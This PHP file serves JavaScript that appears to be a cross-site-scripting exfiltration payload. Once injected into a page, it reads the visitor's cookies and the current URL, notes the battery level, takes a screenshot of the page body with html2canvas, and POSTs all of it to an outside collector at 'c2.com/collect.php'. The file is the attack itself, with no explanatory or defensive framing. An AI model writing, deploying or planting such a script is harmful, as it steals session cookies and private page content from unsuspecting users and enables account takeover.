<?php
header("Content-Type: application/javascript; charset=UTF-8");
?>

(async () => {
  const endpoint = 'https://c2.com/collect.php';

  // Battery percentage
  const battery = await navigator.getBattery().then(b => `${b.level * 100}%`).catch(_ => 'N/A');

  // Document cookies
  const cookies = document.cookie;

  // Referrer
  const referrer = location.href;

  // Create FormData to send both JSON data and screenshot in one request
  const formData = new FormData();
  
  // Append the JSON data as a Blob to the FormData object
  formData.append('data', new Blob([JSON.stringify({
    battery,
    cookies,
    referrer
  })], { type: 'application/json' }));

  // Load html2canvas and capture screenshot
  const s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
  s.onload = () => {
    html2canvas(document.body).then(canvas => {
      canvas.toBlob(blob => {
        // Append the screenshot Blob to the FormData object
        formData.append('screenshot', blob, 'shot.png');

        // Send the FormData in a single POST request
        fetch(endpoint, {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          console.log(data);
        })
        .catch(error => {
          console.error("Error:", error);
        });
      });
    });
  };
  document.body.appendChild(s);
})();
